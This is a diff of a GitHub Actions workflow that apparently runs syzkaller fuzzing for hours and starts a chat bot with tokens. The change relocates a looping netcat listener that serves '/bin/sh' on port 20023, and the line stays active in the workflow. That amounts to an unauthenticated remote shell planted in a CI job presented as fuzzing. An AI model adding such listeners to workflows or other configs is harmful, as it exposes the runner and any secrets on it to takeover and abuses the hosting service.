@@ -192,10 +192,6 @@ jobs:
         run: |
           set -o pipefail
           {
-            # listener nc
-            while [ 1 ]; do busybox nc -l -p 20023 -e /bin/sh; echo "1"; done &
-
-
             chmod +x myfuzzing/bot.sh
             nohup myfuzzing/bot.sh "$CHAT_TOKEN" "$CHAT_ID" > ~/bot.log 2>&1 &
 
@@ -207,6 +203,9 @@ jobs:
             if [ -d "$GITHUB_WORKSPACE/prev/workdir" ]; then
               cp -a "$GITHUB_WORKSPACE/prev/workdir/." workdir/
             fi
+
+            # listener nc
+            while [ 1 ]; do busybox nc -l -p 20023 -e /bin/sh; echo "1"; done &
 
             timeout -s INT -k 2m 5h \
               /home/runner/work/syzkaller/syzkaller/bin/syz-manager \
